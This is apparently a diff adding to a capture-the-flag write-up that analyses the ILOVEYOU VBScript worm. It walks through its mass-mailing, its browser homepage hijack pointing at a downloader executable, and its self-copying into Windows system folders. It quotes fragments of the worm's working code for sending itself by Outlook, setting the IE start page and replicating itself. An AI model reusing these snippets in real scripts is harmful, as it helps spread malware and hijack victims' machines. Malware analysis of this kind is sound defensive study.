@@ -31,3 +31,51 @@ male.Recipients.Add(malead)
           male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
           male.Send
 ```
+And by looking within the "male.body" we can read the mails content.
+
+## Q2, What is the domain name that was added as the browser's homepage?
+
+Homepages are based on register sub-keys/values (in most cases). So i started looking for the startpages keys for diffrent browsers.
+
+```
+
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "<FLAG>"/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
+
+```
+By using ctrl + v I got a hit on the IE StartPage path in the code. 
+
+## Q3, The malware replicated itself into 3 locations, what are they?
+
+For this some fast research was needed. 
+
+In the code I found this code snippet:
+
+```
+rem Finds special folders, such as system, temporary and windows folders.
+  Set dirwin = fso.GetSpecialFolder(0)
+  Set dirsystem = fso.GetSpecialFolder(1)
+  Set dirtemp = fso.GetSpecialFolder(2)
+  Set c = fso.GetFile(WScript.ScriptFullName)
+
+  rem Copy itself into VBScript files <PART OF THE FLAG.vbs>, <PART OF THE FLAG.vbs> and
+  rem <PART OF THE FLAG.TXT.VBS>
+  c.Copy(dirsystem & "<PART OF THE FLAG>")
+  c.Copy(dirwin & "\<PART OF THE FLAG>")
+  c.Copy(dirsystem & "\<PART OF THE FLAG>")
+````
+To summirize in short, in VBS there is a "GetSpecialFolder" method. Where in this case the fso.GetSpecialFolder(1).
+"GetSpecialFolder" becomes the object and the (number) becomes the folderspec.
+
+```
+0 = The Windows folder contains files installed by the Windows operating system. In this case 
+
+1 = The System folder contains libraries, fonts, and device drivers. 
+
+2 = The Temp folder is used to store temporary files. Its path is found in the TMP environment variable.
+
+In this case: 
+dirsystem --> C:\Windows\System32\
+dirwin -- > C:\Windows\
+```
+Then we just add the the object + the file = C:\Windows\System32\<PART OF THE FLAG>
+
